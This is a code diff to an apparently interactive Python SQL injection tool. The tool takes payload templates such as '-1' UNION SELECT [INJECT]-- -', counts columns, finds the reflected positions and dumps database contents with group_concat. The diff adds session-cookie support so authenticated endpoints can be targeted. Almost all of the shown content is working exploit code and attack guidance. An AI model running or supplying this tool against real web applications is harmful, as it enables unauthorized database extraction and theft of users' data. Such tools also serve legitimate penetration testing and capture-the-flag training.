@@ -11,6 +11,7 @@
 # the response). Everything after reads group_concat() out of a visible column.
 #
 # Methods: GET (query string), POST (body).
+# Optional session cookie for endpoints that require an authenticated session.
 # Base value should return NO rows so only the injected UNION row shows, e.g.
 #   numeric GET : 0 UNION SELECT [INJECT]-- -
 #   string login: -1' UNION SELECT [INJECT]-- -
@@ -39,20 +40,33 @@ OTHER_VALUE  = input("Other field value (anything, e.g. x)         : ").strip() 
 # string login: -1' UNION SELECT [INJECT]-- -
 TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()
 
+# --- Optional session cookie ----------------------------------------------
+# Name prompt has a default; pressing Enter uses it. Value prompt takes the
+# raw cookie value only (no "name=" prefix). Blank value -> run without a cookie.
+COOKIE_NAME  = input("Cookie name (Enter for default 'token')      : ").strip() or "token"
+COOKIE_VALUE = input("Session cookie value (blank = no cookie)     : ").strip()
+
+# One session reused for every request; the cookie (if set) rides along
+# automatically in the Cookie header on each request.
+SESSION = requests.Session()
+if COOKIE_VALUE:
+    SESSION.cookies.set(COOKIE_NAME, COOKIE_VALUE)
+
 # MySQL system schemas to skip when dumping "all" (still listed on screen)
 SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]
 
 # --- Request sender (GET -> query string, POST -> body) --------------------
 def send(payload):
+    """Runs over SESSION so the cookie is attached when one was provided."""
     if METHOD == "GET":
         params = {INJ_FIELD: payload}
         if OTHER_FIELD:
             params[OTHER_FIELD] = OTHER_VALUE
-        return requests.get(URL, params=params)
+        return SESSION.get(URL, params=params)
     data = {INJ_FIELD: payload}
     if OTHER_FIELD:
         data[OTHER_FIELD] = OTHER_VALUE
-    return requests.post(URL, data=data)
+    return SESSION.post(URL, data=data)
 
 # --- Calibration: column count + visible positions -------------------------
 # Put a distinct hex-encoded marker in every column. UNION only succeeds when
@@ -77,8 +91,10 @@ if not NCOLS:
     print(f"[!] No UNION reflection up to {MAX_COLS} columns.")
     print("    - Check the template break-out (numeric vs quoted).")
     print("    - The base value must return no rows (use -1 / 0).")
+    print("    - If the endpoint needs auth, check the cookie name/value.")
     print("    - Output may not be reflected -> use blind/error/time instead.")
     print(f"    template = {TEMPLATE!r}")
+    print(f"    cookie   = {COOKIE_NAME}={'(set)' if COOKIE_VALUE else '(none)'}")
     sys.exit(1)
 POS = VISIBLE[0]
 print(f"[+] Columns: {NCOLS} | visible positions: {VISIBLE} | using position {POS}\n")
